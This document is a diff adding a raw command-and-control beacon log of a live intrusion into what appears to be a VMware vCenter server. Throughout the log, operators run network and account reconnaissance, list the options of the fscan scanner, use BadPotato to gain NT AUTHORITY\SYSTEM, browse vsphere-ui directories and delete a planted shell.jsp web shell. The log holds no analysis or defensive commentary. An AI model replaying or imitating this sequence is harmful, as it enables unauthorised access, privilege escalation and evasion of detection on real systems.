@@ -1,0 +1,1575 @@
+01/12 01:07:47 UTC [input] <jiao> shell help.exe
+01/12 01:07:47 UTC [task] <T1059> Tasked beacon to run: help.exe
+01/12 01:07:47 UTC [checkin] host called home, sent: 39 bytes
+01/12 01:07:48 UTC [output]
+received output:
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.3
+Host is none
+Usage of help.exe:
+  -br int
+    	Brute threads (default 1)
+  -c string
+    	exec command (ssh|wmiexec)
+  -cookie string
+    	set poc cookie,-cookie rememberMe=login
+  -debug int
+    	every time to LogErr (default 60)
+  -dns
+    	using dnslog poc
+  -domain string
+    	smb domain
+  -full
+    	poc full scan,as: shiro 100 key
+  -h string
+    	IP address of the host you want to scan,for example: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
+  -hash string
+    	hash
+  -hf string
+    	host file, -hf ip.txt
+  -hn string
+    	the hosts no scan,as: -hn 192.168.1.1/24
+  -json
+    	json output
+  -m string
+    	Select scan type ,as: -m ssh (default "all")
+  -no
+    	not to save output log
+  -nobr
+    	not to Brute password
+  -nocolor
+    	no color
+  -nopoc
+    	not to scan web vul
+  -noredis
+    	no redis sec test
+  -np
+    	not to ping
+  -num int
+    	poc rate (default 20)
+  -o string
+    	Outputfile (default "result.txt")
+  -p string
+    	Select a port,for example: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
+  -pa string
+    	add port base DefaultPorts,-pa 3389
+  -path string
+    	fcgi銆乻mb romote file path
+  -ping
+    	using ping replace icmp
+  -pn string
+    	the ports no scan,as: -pn 445
+  -pocname string
+    	use the pocs these contain pocname, -pocname weblogic
+  -pocpath string
+    	poc file path
+  -portf string
+    	Port File
+  -proxy string
+    	set poc proxy, -proxy http://127.0.0.1:8080
+  -pwd string
+    	password
+  -pwda string
+    	add a password base DefaultPasses,-pwda password
+  -pwdf string
+    	password file
+  -rf string
+    	redis file to write sshkey file (as: -rf id_rsa.pub)
+  -rs string
+    	redis shell to write cron file (as: -rs 192.168.1.1:6666)
+  -sc string
+    	ms17 shellcode,as -sc add
+  -silent
+    	silent scan
+  -socks5 string
+    	set socks5 proxy, will be used in tcp connection, timeout setting will not work
+  -sshkey string
+    	sshkey file (id_rsa)
+  -t int
+    	Thread nums (default 600)
+  -time int
+    	Set timeout (default 3)
+  -top int
+    	show live len top (default 10)
+  -u string
+    	url
+  -uf string
+    	urlfile
+  -user string
+    	username
+  -usera string
+    	add a user base DefaultUsers,-usera user
+  -userf string
+    	username file
+  -wmi
+    	start wmi
+  -wt int
+    	Set web timeout (default 5)
+
+
+01/12 01:08:08 UTC [input] <jiao> shell net view
+01/12 01:08:08 UTC [task] <T1059> Tasked beacon to run: net view
+01/12 01:08:08 UTC [checkin] host called home, sent: 39 bytes
+01/12 01:08:20 UTC [output]
+received output:
+发生系统错误 6118。
+
+此工作组的服务器列表当前无法使用
+
+
+
+01/12 01:08:25 UTC [input] <jiao> shell ipconfig /all
+01/12 01:08:25 UTC [task] <T1059> Tasked beacon to run: ipconfig /all
+01/12 01:08:25 UTC [checkin] host called home, sent: 44 bytes
+01/12 01:08:25 UTC [output]
+received output:
+
+Windows IP 配置
+
+   主机名  . . . . . . . . . . . . . : iZygn0ix8iaheaZ
+   主 DNS 后缀 . . . . . . . . . . . : 
+   节点类型  . . . . . . . . . . . . : 混合
+   IP 路由已启用 . . . . . . . . . . : 否
+   WINS 代理已启用 . . . . . . . . . : 否
+
+以太网适配器 以太网:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter
+   物理地址. . . . . . . . . . . . . : 00-16-3E-26-87-BB
+   DHCP 已启用 . . . . . . . . . . . : 是
+   自动配置已启用. . . . . . . . . . : 是
+   本地链接 IPv6 地址. . . . . . . . : fe80::e8e1:a4f8:12ae:48cd%5(首选) 
+   IPv4 地址 . . . . . . . . . . . . : 10.11.0.16(首选) 
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   获得租约的时间  . . . . . . . . . : 2024年1月10日 19:52:35
+   租约过期的时间  . . . . . . . . . : 2034年1月7日 19:52:35
+   默认网关. . . . . . . . . . . . . : 10.11.0.253
+   DHCP 服务器 . . . . . . . . . . . : 10.11.0.253
+   DHCPv6 IAID . . . . . . . . . . . : 50337342
+   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-2A-15-04-12-00-16-3E-0B-42-83
+   DNS 服务器  . . . . . . . . . . . : 100.100.2.136
+                                       100.100.2.138
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+
+隧道适配器 isatap.{D09299DC-C302-42FF-89D5-3BDE832FB950}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+
+隧道适配器 Teredo Tunneling Pseudo-Interface:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+
+
+01/12 01:09:08 UTC [input] <jiao> net user
+01/12 01:09:08 UTC [task] <T1087, T1093> Tasked beacon to run net user on localhost
+01/12 01:09:08 UTC [checkin] host called home, sent: 105057 bytes
+01/12 01:09:10 UTC [output]
+received output:
+Users for \\localhost:
+
+Administrator (admin)
+cm
+content-library
+DefaultAccount
+eam
+Guest
+imagebuilder
+mbcs
+netdumper
+perfcharts
+rbd
+vapiEndpoint
+vmware-vpostgres
+vsan-health
+vsm
+vsphere-client
+vsphere-ui
+
+
+01/12 01:09:23 UTC [input] <jiao> net session
+01/12 01:09:23 UTC [error] net error: argument 'session' is not a net command
+01/12 01:09:27 UTC [input] <jiao> shell net session
+01/12 01:09:27 UTC [task] <T1059> Tasked beacon to run: net session
+01/12 01:09:27 UTC [checkin] host called home, sent: 42 bytes
+01/12 01:09:27 UTC [output]
+received output:
+列表是空的。
+
+
+
+01/12 01:09:34 UTC [input] <jiao> shell route print
+01/12 01:09:34 UTC [task] <T1059> Tasked beacon to run: route print
+01/12 01:09:34 UTC [checkin] host called home, sent: 42 bytes
+01/12 01:09:34 UTC [output]
+received output:
+===========================================================================
+接口列表
+  5...00 16 3e 26 87 bb ......Red Hat VirtIO Ethernet Adapter
+  1...........................Software Loopback Interface 1
+  7...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
+  2...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
+===========================================================================
+
+IPv4 路由表
+===========================================================================
+活动路由:
+网络目标        网络掩码          网关       接口   跃点数
+          0.0.0.0          0.0.0.0      10.11.0.253       10.11.0.16     15
+        10.11.0.0    255.255.255.0            在链路上        10.11.0.16    271
+       10.11.0.16  255.255.255.255            在链路上        10.11.0.16    271
+      10.11.0.255  255.255.255.255            在链路上        10.11.0.16    271
+        127.0.0.0        255.0.0.0            在链路上         127.0.0.1    331
+        127.0.0.1  255.255.255.255            在链路上         127.0.0.1    331
+  127.255.255.255  255.255.255.255            在链路上         127.0.0.1    331
+        224.0.0.0        240.0.0.0            在链路上         127.0.0.1    331
+        224.0.0.0        240.0.0.0            在链路上        10.11.0.16    271
+  255.255.255.255  255.255.255.255            在链路上         127.0.0.1    331
+  255.255.255.255  255.255.255.255            在链路上        10.11.0.16    271
+===========================================================================
+永久路由:
+  无
+
+IPv6 路由表
+===========================================================================
+活动路由:
+ 接口跃点数网络目标                网关
+  2    331 ::/0                     在链路上
+  1    331 ::1/128                  在链路上
+  2    331 2001::/32                在链路上
+  2    331 2001:0:348b:fb58:2857:2cee:87e5:34c6/128
+                                    在链路上
+  5    271 fe80::/64                在链路上
+  2    331 fe80::/64                在链路上
+  2    331 fe80::2857:2cee:87e5:34c6/128
+                                    在链路上
+  5    271 fe80::e8e1:a4f8:12ae:48cd/128
+                                    在链路上
+  1    331 ff00::/8                 在链路上
+  5    271 ff00::/8                 在链路上
+  2    331 ff00::/8                 在链路上
+===========================================================================
+永久路由:
+  无
+
+
+01/12 01:09:54 UTC [input] <jiao> shell arp -a
+01/12 01:09:54 UTC [task] <T1059> Tasked beacon to run: arp -a
+01/12 01:09:54 UTC [checkin] host called home, sent: 37 bytes
+01/12 01:09:54 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C arp -a: 5 - ERROR_ACCESS_DENIED
+01/12 01:10:09 UTC [input] <jiao> net time /domain
+01/12 01:10:09 UTC [error] net error: argument '/domain' is not a \\target
+01/12 01:10:16 UTC [input] <jiao> shell net time /domain
+01/12 01:10:16 UTC [task] <T1059> Tasked beacon to run: net time /domain
+01/12 01:10:16 UTC [checkin] host called home, sent: 47 bytes
+01/12 01:10:16 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C net time /domain: 5 - ERROR_ACCESS_DENIED
+01/12 01:10:20 UTC [input] <jiao> shell net time
+01/12 01:10:20 UTC [task] <T1059> Tasked beacon to run: net time
+01/12 01:10:20 UTC [checkin] host called home, sent: 39 bytes
+01/12 01:10:32 UTC [input] <jiao> shell net group "domain controllers" /domain
+01/12 01:10:32 UTC [task] <T1059> Tasked beacon to run: net group "domain controllers" /domain
+01/12 01:10:32 UTC [checkin] host called home, sent: 69 bytes
+01/12 01:10:32 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C net group "domain controllers" /domain: 5 - ERROR_ACCESS_DENIED
+01/12 01:10:32 UTC [output]
+received output:
+找不到时间服务器。
+
+请键入 NET HELPMSG 3912 以获得更多的帮助。
+
+
+
+01/12 01:10:44 UTC [input] <jiao> shell net group /domain
+01/12 01:10:44 UTC [task] <T1059> Tasked beacon to run: net group /domain
+01/12 01:10:44 UTC [checkin] host called home, sent: 48 bytes
+01/12 01:10:44 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C net group /domain: 5 - ERROR_ACCESS_DENIED
+01/12 01:11:14 UTC [input] <jiao> shell help.exe -h 10.11.0.16/24
+01/12 01:11:14 UTC [task] <T1059> Tasked beacon to run: help.exe -h 10.11.0.16/24
+01/12 01:11:14 UTC [checkin] host called home, sent: 56 bytes
+01/12 01:11:14 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C help.exe -h 10.11.0.16/24: 5 - ERROR_ACCESS_DENIED
+01/12 01:11:25 UTC [input] <jiao> shell whoami
+01/12 01:11:25 UTC [task] <T1059> Tasked beacon to run: whoami
+01/12 01:11:25 UTC [checkin] host called home, sent: 37 bytes
+01/12 01:11:25 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C whoami: 5 - ERROR_ACCESS_DENIED
+01/12 01:11:46 UTC [input] <jiao> shell whoami
+01/12 01:11:46 UTC [task] <T1059> Tasked beacon to run: whoami
+01/12 01:11:47 UTC [checkin] host called home, sent: 37 bytes
+01/12 01:11:47 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C whoami: 5 - ERROR_ACCESS_DENIED
+01/12 01:16:56 UTC [input] <qwe> ls
+01/12 01:16:56 UTC [task] <> Tasked beacon to list files in .
+01/12 01:16:56 UTC [checkin] host called home, sent: 19 bytes
+01/12 01:16:56 UTC [output]
+C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin\*
+D	0	01/11/2024 21:47:31	.
+D	0	01/11/2024 21:47:31	..
+F	19456	01/11/2024 20:20:46	chinese.exe
+F	1121	04/09/2018 13:41:56	heapsize_wrapper.bat
+F	6427136	01/11/2024 21:47:45	help.exe
+F	20783	07/17/2023 10:11:29	hs_err_pid10560.log
+F	4473	04/09/2018 13:41:56	InstallPerfCharts.bat
+F	4475	04/09/2018 13:41:56	QueryPerfCharts.bat
+F	185852	07/17/2023 10:11:29	replay_pid10560.log
+F	4475	04/09/2018 13:41:56	StartPerfCharts.bat
+F	4475	04/09/2018 13:41:56	StopPerfCharts.bat
+F	4475	04/09/2018 13:41:56	UninstallPerfCharts.bat
+F	640952	04/09/2018 13:42:18	wrapper.exe
+
+
+01/12 01:17:41 UTC [error] Dropped responses from session. Didn't expect 4 prior to first task.
+01/12 01:17:41 UTC [error] Dropped responses from session. Didn't expect 4 prior to first task.
+01/12 01:17:48 UTC [error] Dropped responses from session. Didn't expect 4 prior to first task.
+01/12 01:17:48 UTC [error] Dropped responses from session. Didn't expect 4 prior to first task.
+01/12 01:18:23 UTC [input] <jiao> badcmd whoami
+01/12 01:18:24 UTC [task] <T1093> Tasked beacon to run .NET program: BadPotato.exe "whoami "
+01/12 01:18:27 UTC [input] <jiao> 
+01/12 01:18:27 UTC [error] Unknown command: 
+01/12 01:18:27 UTC [checkin] host called home, sent: 166973 bytes
+01/12 01:18:28 UTC [output]
+received output:
+[*]
+
+    ____            ______        __        __      
+   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
+  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
+ / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
+/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 
+
+Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
+            
+[*] PipeName : \\.\pipe\3f21e45d74ce406ab5fe89aba1cf48bd\pipe\spoolss
+[*] ConnectPipeName : \\iZygn0ix8iaheaZ/pipe/3f21e45d74ce406ab5fe89aba1cf48bd
+[*] CreateNamedPipeW Success! IntPtr:876
+
+
+01/12 01:18:32 UTC [output]
+received output:
+[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:1833061713056
+[*] ConnectNamePipe Success!
+[*] CurrentUserName : SYSTEM
+[*] CurrentConnectPipeUserName : SYSTEM
+[*] ImpersonateNamedPipeClient Success!
+[*] OpenThreadToken Success! IntPtr:1048
+[*] DuplicateTokenEx Success! IntPtr:1052
+[*] SetThreadToken Success!
+[*] CurrentThreadUserName : NT AUTHORITY\SYSTEM
+[*] CreateOutReadPipe Success! out_read:1060 out_write:1068
+[*] CreateErrReadPipe Success! err_read:1072 err_write:1076
+
+
+01/12 01:18:33 UTC [output]
+received output:
+[*] CreateProcessWithTokenW Success! ProcessPid:15056
+nt authority\system
+
+
+[*] Bye!
+
+
+01/12 01:18:40 UTC [input] <jiao> badcmd dir
+01/12 01:18:41 UTC [task] <T1093> Tasked beacon to run .NET program: BadPotato.exe "dir "
+01/12 01:18:41 UTC [checkin] host called home, sent: 166967 bytes
+01/12 01:18:42 UTC [output]
+received output:
+[*]
+
+    ____            ______        __        __      
+   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
+  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
+ / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
+/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 
+
+Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
+            
+[*] PipeName : \\.\pipe\ff2ac4c36a814f35b6f0331301947e99\pipe\spoolss
+[*] ConnectPipeName : \\iZygn0ix8iaheaZ/pipe/ff2ac4c36a814f35b6f0331301947e99
+[*] CreateNamedPipeW Success! IntPtr:872
+
+
+01/12 01:18:47 UTC [output]
+received output:
+[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2784694791824
+[*] ConnectNamePipe Success!
+[*] CurrentUserName : SYSTEM
+[*] CurrentConnectPipeUserName : SYSTEM
+[*] ImpersonateNamedPipeClient Success!
+[*] OpenThreadToken Success! IntPtr:1044
+[*] DuplicateTokenEx Success! IntPtr:1048
+[*] SetThreadToken Success!
+[*] CurrentThreadUserName : NT AUTHORITY\SYSTEM
+[*] CreateOutReadPipe Success! out_read:1056 out_write:1064
+[*] CreateErrReadPipe Success! err_read:1068 err_write:1072
+[*] CreateProcessWithTokenW Success! ProcessPid:16344
+ 驱动器 C 中的卷没有标签。
+
+ 卷的序列号是 660D-A0DD
+
+ C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin 的目录
+
+
+2024/01/11  21:47    <DIR>          .
+
+
+2024/01/11  21:47    <DIR>          ..
+
+
+2024/01/11  20:20            19,456 chinese.exe
+
+2018/04/09  13:41             1,121 heapsize_wrapper.bat
+
+2024/01/11  21:47         6,427,136 help.exe
+2023/07/17  10:11            20,783 hs_err_pid10560.log
+2018/04/09  13:41             4,473 InstallPerfCharts.bat
+
+2018/04/09  13:41             4,475 QueryPerfCharts.bat
+
+2023/07/17  10:11           185,852 replay_pid10560.log
+
+2018/04/09  13:41             4,475 StartPerfCharts.bat
+
+2018/04/09  13:41             4,475 StopPerfCharts.bat
+
+2018/04/09  13:41             4,475 UninstallPerfCharts.bat
+
+2018/04/09  13:42           640,952 wrapper.exe
+
+
+              11 个文件      7,317,673 字节
+
+               2 个目录 299,620,429,824 可用字节
+
+[*] Bye!
+
+
+01/12 01:19:06 UTC [input] <jiao> badcmd help.exe -h 10.11.0.16/24
+01/12 01:19:06 UTC [task] <T1093> Tasked beacon to run .NET program: BadPotato.exe "help.exe -h 10.11.0.16/24 "
+01/12 01:19:06 UTC [checkin] host called home, sent: 167011 bytes
+01/12 01:19:07 UTC [output]
+received output:
+[*]
+
+    ____            ______        __        __      
+   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
+  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
+ / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
+/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 
+
+Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
+            
+[*] PipeName : \\.\pipe\412f2b159eff4f4e887f7b1fd9fc8b0d\pipe\spoolss
+[*] ConnectPipeName : \\iZygn0ix8iaheaZ/pipe/412f2b159eff4f4e887f7b1fd9fc8b0d
+[*] CreateNamedPipeW Success! IntPtr:880
+
+
+01/12 01:19:12 UTC [output]
+received output:
+[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:1829241430752
+[*] ConnectNamePipe Success!
+[*] CurrentUserName : SYSTEM
+[*] CurrentConnectPipeUserName : SYSTEM
+[*] ImpersonateNamedPipeClient Success!
+[*] OpenThreadToken Success! IntPtr:1008
+[*] DuplicateTokenEx Success! IntPtr:1012
+[*] SetThreadToken Success!
+[*] CurrentThreadUserName : NT AUTHORITY\SYSTEM
+[*] CreateOutReadPipe Success! out_read:1060 out_write:1068
+[*] CreateErrReadPipe Success! err_read:1072 err_write:1076
+拒绝访问。
+[!] CreateProcessWithTokenW fail!
+
+
+01/12 01:21:22 UTC [input] <jiao> shell whoami
+01/12 01:21:22 UTC [task] <T1059> Tasked beacon to run: whoami
+01/12 01:21:22 UTC [checkin] host called home, sent: 37 bytes
+01/12 01:21:23 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C whoami: 5 - ERROR_ACCESS_DENIED
+01/12 01:24:59 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+01/12 01:24:59 UTC [checkin] host called home, sent: 19 bytes
+01/12 01:25:01 UTC [task] <> Tasked beacon to list files in C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\ (from File Browser)
+01/12 01:25:01 UTC [checkin] host called home, sent: 75 bytes
+01/12 01:25:02 UTC [task] <> Tasked beacon to list files in C:\Program Files\VMware\vCenter Server\perfcharts\ (from File Browser)
+01/12 01:25:02 UTC [checkin] host called home, sent: 67 bytes
+01/12 01:25:05 UTC [task] <> Tasked beacon to list files in C:\Program Files\VMware\vCenter Server\ (from File Browser)
+01/12 01:25:05 UTC [checkin] host called home, sent: 56 bytes
+01/12 01:25:31 UTC [task] <> Tasked beacon to list files in C:\ (from File Browser)
+01/12 01:25:31 UTC [checkin] host called home, sent: 20 bytes
+01/12 01:25:35 UTC [task] <> Tasked beacon to list files in C:\Users\ (from File Browser)
+01/12 01:25:35 UTC [checkin] host called home, sent: 26 bytes
+01/12 01:25:35 UTC [task] <> Tasked beacon to list files in C:\Users\ (from File Browser)
+01/12 01:25:36 UTC [checkin] host called home, sent: 26 bytes
+01/12 01:25:37 UTC [task] <> Tasked beacon to list files in C:\usr\ (from File Browser)
+01/12 01:25:37 UTC [checkin] host called home, sent: 24 bytes
+01/12 01:25:37 UTC [task] <> Tasked beacon to list files in C:\usr\ (from File Browser)
+01/12 01:25:38 UTC [checkin] host called home, sent: 24 bytes
+01/12 01:25:41 UTC [task] <> Tasked beacon to list files in C:\usr\lib\ (from File Browser)
+01/12 01:25:41 UTC [checkin] host called home, sent: 28 bytes
+01/12 01:25:41 UTC [task] <> Tasked beacon to list files in C:\usr\lib\ (from File Browser)
+01/12 01:25:41 UTC [checkin] host called home, sent: 28 bytes
+01/12 01:25:43 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\ (from File Browser)
+01/12 01:25:43 UTC [checkin] host called home, sent: 46 bytes
+01/12 01:25:45 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\ (from File Browser)
+01/12 01:25:45 UTC [checkin] host called home, sent: 53 bytes
+01/12 01:25:46 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\ (from File Browser)
+01/12 01:25:46 UTC [checkin] host called home, sent: 58 bytes
+01/12 01:25:47 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\ (from File Browser)
+01/12 01:25:47 UTC [checkin] host called home, sent: 67 bytes
+01/12 01:25:47 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\ (from File Browser)
+01/12 01:25:48 UTC [checkin] host called home, sent: 69 bytes
+01/12 01:25:48 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\ (from File Browser)
+01/12 01:25:48 UTC [checkin] host called home, sent: 76 bytes
+01/12 01:25:50 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\ (from File Browser)
+01/12 01:25:50 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:25:51 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\ (from File Browser)
+01/12 01:25:51 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:25:53 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\1\ (from File Browser)
+01/12 01:25:53 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:25:54 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\1\0\ (from File Browser)
+01/12 01:25:54 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:25:55 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\2\ (from File Browser)
+01/12 01:25:55 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:25:56 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\2\0\ (from File Browser)
+01/12 01:25:56 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:25:58 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\3\ (from File Browser)
+01/12 01:25:58 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:25:58 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\3\0\ (from File Browser)
+01/12 01:25:58 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:25:59 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\ (from File Browser)
+01/12 01:26:00 UTC [checkin] host called home, sent: 79 bytes
+01/12 01:26:00 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\0\ (from File Browser)
+01/12 01:26:00 UTC [checkin] host called home, sent: 81 bytes
+01/12 01:26:01 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\7\ (from File Browser)
+01/12 01:26:01 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:26:02 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\7\0\ (from File Browser)
+01/12 01:26:02 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:26:04 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\7\0\h5ngc.war\ (from File Browser)
+01/12 01:26:04 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:26:05 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\7\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:26:05 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:26:20 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\6\ (from File Browser)
+01/12 01:26:20 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:26:21 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\6\0\ (from File Browser)
+01/12 01:26:21 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:26:22 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\6\0\h5ngc.war\ (from File Browser)
+01/12 01:26:22 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:26:24 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\6\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:26:24 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:26:27 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\5\ (from File Browser)
+01/12 01:26:27 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:26:28 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\5\0\ (from File Browser)
+01/12 01:26:28 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:26:29 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\5\0\h5ngc.war\ (from File Browser)
+01/12 01:26:29 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:26:30 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\5\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:26:30 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:26:32 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\4\ (from File Browser)
+01/12 01:26:32 UTC [checkin] host called home, sent: 78 bytes
+01/12 01:26:32 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\4\0\ (from File Browser)
+01/12 01:26:33 UTC [checkin] host called home, sent: 80 bytes
+01/12 01:26:33 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\4\0\h5ngc.war\ (from File Browser)
+01/12 01:26:33 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:26:35 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\4\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:26:35 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:26:37 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\0\h5ngc.war\ (from File Browser)
+01/12 01:26:37 UTC [checkin] host called home, sent: 91 bytes
+01/12 01:26:38 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:26:38 UTC [checkin] host called home, sent: 101 bytes
+01/12 01:26:51 UTC [input] <jiao> rm C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\0\h5ngc.war\resources\shell.jsp
+01/12 01:26:51 UTC [task] <T1107, > Tasked beacon to remove C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\0\h5ngc.war\resources\shell.jsp
+01/12 01:26:51 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\41\0\h5ngc.war\resources (from File Browser)
+01/12 01:26:51 UTC [checkin] host called home, sent: 202 bytes
+01/12 01:28:13 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\3\0\h5ngc.war\ (from File Browser)
+01/12 01:28:13 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:28:14 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\3\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:28:14 UTC [checkin] host called home, sent: 100 bytes
